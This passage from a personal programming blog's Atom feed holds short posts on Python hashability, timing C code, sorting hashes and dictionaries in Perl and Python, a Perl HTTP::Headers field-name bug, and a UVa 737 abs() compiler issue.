&lt;li&gt;
&lt;p&gt;Can we create an user defined type that is hashable but mutable?  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Can we create an user defined type that is not hashable but immutable?  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;If the answers of the four questions above is "No".  &lt;/p&gt;
&lt;p&gt;Does it mean that we can use hash() to check if an object is mutable or not?  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Refs:&lt;br /&gt;
&lt;a href="http://stackoverflow.com/questions/2671376/hashable-immutable"&gt;http://stackoverflow.com/questions/2671376/hashable-immutable&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://docs.python.org/3/reference/datamodel.html#object.__hash__"&gt;http://docs.python.org/3/reference/datamodel.html#object.&lt;strong&gt;hash&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://docs.python.org/3/tutorial/classes.html"&gt;http://docs.python.org/3/tutorial/classes.html&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://eli.thegreenplace.net/2012/03/30/python-objects-types-classes-and-instances-a-glossary/"&gt;http://eli.thegreenplace.net/2012/03/30/python-objects-types-classes-and-instances-a-glossary/&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://stackoverflow.com/questions/4374006/check-for-mutability-in-python"&gt;http://stackoverflow.com/questions/4374006/check-for-mutability-in-python&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://stackoverflow.com/questions/4418741/im-able-to-use-a-mutable-object-as-a-dictionary-key-in-python-is-this-not-disa"&gt;http://stackoverflow.com/questions/4418741/im-able-to-use-a-mutable-object-as-a-dictionary-key-in-python-is-this-not-disa&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://www.velocityreviews.com/forums/t734950-how-to-test-for-atomicity-mutability-hashability.html"&gt;http://www.velocityreviews.com/forums/t734950-how-to-test-for-atomicity-mutability-hashability.html&lt;/a&gt;  &lt;/p&gt;</summary><category term="Python"></category><category term="Python3"></category><category term="mutable"></category><category term="hashable"></category></entry><entry><title>Estimate program execution time in C</title><link href="https://blog.m157q.tw/posts/2013/05/30/estimate-program-execution-time-in-c/" rel="alternate"></link><published>2015-10-28T13:15:00+08:00</published><updated>2015-10-28T13:15:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-05-30:posts/2013/05/30/estimate-program-execution-time-in-c/</id><summary type="html">&lt;p&gt;Just wanna estimate the process time of my algorithm homework.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Method 1&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/time.h&amp;gt;  &lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;timeval&lt;/span&gt; &lt;span class="n"&gt;t_start&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;t_end&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  

&lt;span class="n"&gt;gettimeofday&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;t_start&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;t_start&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tv_sec&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;t_start&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tv_usec&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;1000000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  

&lt;span class="c1"&gt;// Code to be estimated here  &lt;/span&gt;

&lt;span class="n"&gt;gettimeofday&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;t_end&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="kt"&gt;double&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;t_end&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tv_sec&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;double&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;t_end&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tv_usec&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;1000000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  

&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%f seconds&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This method came from one of my Data Structure homework in last semester.  &lt;/p&gt;
&lt;p&gt;Can estimated even if the process time is less than one second.  &lt;/p&gt;
&lt;p&gt;This is the method which I prefer to use.  &lt;/p&gt;
&lt;p&gt;But, &lt;a href="http://www.cplusplus.com/forum/beginner/22384/"&gt;sys/time.h is a POSIX header, not part of the C/C++ standard library.&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;So, this method can only be implemented on UNIX system.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Method 2&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;time.h&amp;gt;  &lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;clock_t&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;clock&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  

&lt;span class="c1"&gt;//Code to be estimated here  &lt;/span&gt;

&lt;span class="kt"&gt;clock_t&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;clock&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  

&lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%f seconds&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;end&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;CLOCKS_PER_SEC&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This method seems be common used.  &lt;/p&gt;
&lt;p&gt;But, seems it cannot estimate those process time less than one second.  &lt;/p&gt;
&lt;p&gt;Don't Know why... even if I remove the / (float)CLOCKS_PER_SEC.   &lt;/p&gt;
&lt;p&gt;It still comes out zero. O_o"  &lt;/p&gt;</summary><category term="C"></category><category term="Cpp"></category></entry><entry><title>Sort hash by key or by value in Perl 5.16</title><link href="https://blog.m157q.tw/posts/2013/05/10/sort-hash-by-key-or-by-value-in-perl-5-16/" rel="alternate"></link><published>2015-10-28T15:12:00+08:00</published><updated>2015-10-28T15:12:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-05-10:posts/2013/05/10/sort-hash-by-key-or-by-value-in-perl-5-16/</id><summary type="html">&lt;p&gt;&lt;code&gt;%h = hash, $key = keys in %h&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Sort by key&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# if key is int  &lt;/span&gt;
    &lt;span class="c1"&gt;# ascending  &lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%hash&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $hash{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  

    &lt;span class="c1"&gt;# descending  &lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;reverse&lt;/span&gt; &lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%hash&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $hash{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  

&lt;span class="c1"&gt;# if key is str (represent number)  &lt;/span&gt;
    &lt;span class="c1"&gt;# ascending  &lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="sr"&gt;&amp;lt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $h{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  

    &lt;span class="c1"&gt;# descending  &lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$b&lt;/span&gt; &lt;span class="sr"&gt;&amp;lt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $h{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Sort by value (int)&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# value of %h is int ($h{$key})  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# ascending order  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$hash&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="sr"&gt;&amp;lt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$hash&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;};}&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $h{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  

&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="c1"&gt;# descending order  &lt;/span&gt;
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$hash&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="sr"&gt;&amp;lt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$hash&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;};}&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $h{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;</summary><category term="Perl"></category><category term="sort"></category></entry><entry><title>[Python] Sort dictionary by key or value</title><link href="https://blog.m157q.tw/posts/2013/05/10/python-sort-dictionary-by-key-or-value/" rel="alternate"></link><published>2013-05-10T16:33:00+08:00</published><updated>2013-05-10T16:33:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-05-10:posts/2013/05/10/python-sort-dictionary-by-key-or-value/</id><summary type="html">&lt;h1&gt;in python3.3&lt;/h1&gt;
&lt;p&gt;&lt;!--more--&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(k, v) == (key, value)  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h4&gt;sort by key&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;t[0] means key  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h4&gt;sort by value&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;t[1] means value  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;--  &lt;/p&gt;</summary><category term="Python"></category><category term="Sort"></category><category term="Python3"></category></entry><entry><title>Illegal field name 'X-Meta-Twitter:card'</title><link href="https://blog.m157q.tw/posts/2013/05/08/illegal-field-name-x-meta-twittercard/" rel="alternate"></link><published>2015-10-28T15:07:00+08:00</published><updated>2015-10-28T15:07:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-05-08:posts/2013/05/08/illegal-field-name-x-meta-twittercard/</id><summary type="html">&lt;p&gt;最近因為 NA 作業2 開始寫 Perl&lt;br /&gt;
其中一個是寫 IRC bot&lt;br /&gt;
作業 Demo 完後自己繼續開發新功能&lt;br /&gt;
要做檢查到 URL 就回應該 URL Html source 的 title label 和 縮網址&lt;br /&gt;
用了 CPAN 的 &lt;code&gt;WWW::Mechanize&lt;/code&gt;&lt;br /&gt;
結果 xatier 丟了 &lt;a href="https://gist.github.com/xatier/5538258"&gt;gist:5538258 · GitHub&lt;/a&gt; 出來後&lt;br /&gt;
IRC bot 就 die 了&lt;br /&gt;
噴出了這行錯誤  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Illegal field name 'X-Meta-Twitter:card' at .../HTML/HeadParser.pm line 207.&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Google 了一下 Error Message 發現不少人都有遇到  &lt;/p&gt;
&lt;p&gt;根據這篇底下的 comment 找到了答案 (其實自己先 Trace code 之後也找到了同樣的地方  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/libwww-perl/http-message/issues/3#issuecomment-10118644"&gt;lwp-download fails with HTTP::Message 6.06 · Issue #3 · libwww-perl/http-message · GitHub&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;問題就出在 &lt;code&gt;perl5/lib/per5/HTTP/Headers.pm&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;HTML::HeadParser&lt;/code&gt; 有用到 &lt;code&gt;HTTP::Headers&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;裏面有個叫 &lt;code&gt;_header&lt;/code&gt; 的 subroutine (不過在上面那篇的 comment 裏面好像是 header  &lt;/p&gt;
&lt;p&gt;裏面有一行  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nn"&gt;Carp::&lt;/span&gt;&lt;span class="n"&gt;croak&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Illegal field name &amp;#39;$field&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;rindex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$field&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;length&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;問題就出在  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;rindex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$field&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;只要 &lt;code&gt;:&lt;/code&gt; 後面有東西的話就會回傳 &lt;code&gt;True&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Twiiter:card&lt;/code&gt; 的 &lt;code&gt;:&lt;/code&gt; 後面有 &lt;code&gt;card&lt;/code&gt; 所以被判定成 &lt;code&gt;Illegal field name&lt;/code&gt; 了  &lt;/p&gt;
&lt;p&gt;要修正的話就照那個 comment 說的  &lt;/p&gt;
&lt;p&gt;把該行改成  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nn"&gt;Carp::&lt;/span&gt;&lt;span class="n"&gt;croak&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Illegal field name &amp;#39;$field&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nv"&gt;$field&lt;/span&gt; &lt;span class="o"&gt;!~&lt;/span&gt; &lt;span class="sr"&gt;/^X-Meta/&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;rindex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$field&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;length&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這樣就不會判斷 &lt;code&gt;X-Meta&lt;/code&gt; 開頭的了  &lt;/p&gt;
&lt;p&gt;只是這問題己經 6~7 個月了 開發者最近 commit 的時間也還是 2 個月前  &lt;/p&gt;
&lt;p&gt;不懂為啥這問題遲遲不解決@@  &lt;/p&gt;</summary><category term="Perl"></category><category term="CPAN"></category><category term="WWW::Mechanize"></category><category term="X-Meta-Twitter:card"></category></entry><entry><title>[Cpp] [Online Judge] UVa 737 Gleaming the Cubes</title><link href="https://blog.m157q.tw/posts/2013/04/29/cpp-online-judge-uva-737-gleaming-the-cubes/" rel="alternate"></link><published>2013-04-29T20:16:00+08:00</published><updated>2013-04-29T20:16:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-04-29:posts/2013/04/29/cpp-online-judge-uva-737-gleaming-the-cubes/</id><summary type="html">&lt;p&gt;2013/04/29 基礎程式檢定考題之一&lt;br /&gt;
(共7題 我寫了三題 只對一題Orz 後來花時間把沒寫完的兩題寫完 這是其中一題)  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://uva.onlinejudge.org/external/7/737.html"&gt;http://uva.onlinejudge.org/external/7/737.html&lt;/a&gt;  &lt;/p&gt;
&lt;!--more--&gt;

&lt;p&gt;這題是被 Compiler 雷到... 答案算是已經寫出來了...Orz  &lt;/p&gt;
&lt;p&gt;上機考的電腦是用 gcc 4.2.x 在本地端 compile 沒有噴 error  &lt;/p&gt;
&lt;p&gt;考完後在自己的筆電上的 gcc 4.8.0 測試也沒噴 error  &lt;/p&gt;
&lt;p&gt;結果上傳上去就噴 error 說找不到適合的 overloaded function 可用  &lt;/p&gt;
&lt;p&gt;究竟程式檢定 server 用的 compiler 是哪一個啊@_@?  &lt;/p&gt;
&lt;p&gt;但結果追根究底是因為我沒搞清楚 &lt;code&gt;abs()&lt;/code&gt; 這個 function...  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;cstdlib&lt;/code&gt; 和 &lt;code&gt;cmath&lt;/code&gt; 都有 &lt;code&gt;abs()&lt;/code&gt; 這個 function  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;cstdlib&lt;/code&gt; 的 &lt;code&gt;abs()&lt;/code&gt; 是給整數型態用的 &lt;code&gt;cmath&lt;/code&gt; 的 &lt;code&gt;abs()&lt;/code&gt; 是給浮點數型態用的  &lt;/p&gt;
&lt;p&gt;而我在這裡要取的是整數型態的絕對值 所以應該要 &lt;code&gt;#include &amp;lt;cstdlib&amp;gt;&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;結果我記錯 寫了 &lt;code&gt;#include &amp;lt;cmath&amp;gt;&lt;/code&gt; (然後就是悲劇Orz  &lt;/p&gt;
&lt;p&gt;請參閱&lt;br /&gt;
&lt;a href="http://www.cplusplus.com/reference/cstdlib/abs/"&gt;http://www.cplusplus.com/reference/cstdlib/abs/&lt;/a&gt;&lt;br /&gt;
